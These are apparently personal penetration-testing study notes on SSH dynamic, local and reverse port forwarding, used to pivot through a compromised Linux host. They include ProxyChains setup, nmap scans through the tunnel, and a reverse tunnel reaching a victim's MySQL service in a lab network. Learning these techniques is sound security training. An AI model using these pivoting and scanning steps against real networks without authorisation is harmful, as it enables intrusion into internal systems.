# SSH Port Fowarding
## Dynamic Port Forwarding
```
Command prototype for dynamic port forwarding using SSH
ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>

With the above syntax in mind, we can create a local SOCKS4 application proxy (-N -D) on our Kali Linux machine on TCP port 8080 (127.0.0.1:8080), which will tunnel all incoming traffic to any host in the target network, through the compromised Linux machine, which we log into as student (student@10.11.0.128):

Creating a dynamic SSH tunnel on TCP port 8080 to our target network
kali@kali:~$ sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128

We can run any network application through HTTP, SOCKS4, and SOCKS5 proxies with the help of ProxyChains.
To configure ProxyChains, we simply edit the main configuration file (/etc/proxychains.conf) and add our SOCKS4 proxy to it:

Adding our SOCKS4 proxy to the ProxyChains configuration file
kali@kali:~$ cat /etc/proxychains.conf
...

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 8080 


To run our tools through our SOCKS4 proxy, we prepend each command with proxychains.
or example, let's attempt to scan the Windows Server 2016 machine on the internal target network using nmap. In this example, we aren't supplying any options to proxychains except for the nmap command and its arguments:

kali@kalFi:~$ sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.x

ProxyChains worked as expected, routing all of our traffic to the various ports dynamically, without having to supply individual port forwards.

By default, ProxyChains will attempt to read its configuration file first from the current directory, then from the user's $(HOME)/.proxychains directory, and finally from /etc/proxychains.conf. This allows us to run tools through multiple dynamic tunnels, depending on our needs.
```

## Local Port Forwarding
```
ssh -N -L [bind_address:]port:host:hostport [username@address]
 -L parameter specifies the port on the local host that will be forwarded to a remote address and port.
 
 To pull this off, we will execute an ssh command from our Kali Linux attack machine. We will not technically issue any ssh commands (-N) but will set up port forwarding (with -L), bind port 445 on our local machine (0.0.0.0:445) to port 445 on the Windows Server (192.168.1.110:445) and do this through a session to our original Linux target, logging in as student (student@10.11.0.x):

Forwarding TCP port 445 on our Kali Linux machine to TCP port 445 on the Windows Server 2016
kali@kali:~$ sudo ssh -N -L 0.0.0.0:445:192.168.1.x:445 student@10.11.0.128
student@10.11.0.128's password:  
```

## Reverse Port Forwarding
```
ssh -R 127.0.0.1:80:192.168.56.33:80 root@192.168.56.31

source first, local host on client port 80
destination web server on port 80
ssh connection back to client running at 31

now go back to client and look at netstat -ano | grep LIST | grep tcp
you now have a listener on your local client port 80, if you send traffic to this port it goes backwards through ssh to intermediate to the segmented target

ssh -N -R 10.11.0.x:2221:127.0.0.1:3306 kali@10.11.0.x

With the tunnel up, we can switch to our Kali machine, validate that TCP port 2221 is listening, and scan the localhost on that port with nmap, which will fingerprint the target’s MySQL service:

kali@kali:~$ ss -antp | grep "2221"
LISTEN   0   128    127.0.0.1:2221     0.0.0.0:*      users:(("sshd",pid=2294,fd=9))
LISTEN   0   128      [::1]:2221         [::]:*       users:(("sshd",pid=2294,fd=8))

Accessing the MYSQL server on the victim machine through the remote tunnel
kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 2221

Nmap scan report for localhost (127.0.0.1)
Host is up (0.000039s latency).

PORT     STATE SERVICE VERSION
2221/tcp open  mysql   MySQL 5.5.5-10.1.26-MariaDB-0+deb9u1

Nmap done: 1 IP address (1 host up) scanned in 0.56 seconds
  
Knowing that we can scan the port, we should have no problem interacting with the MySQL service across the SSH tunnel using any of the appropriate Kali-installed tools.
```



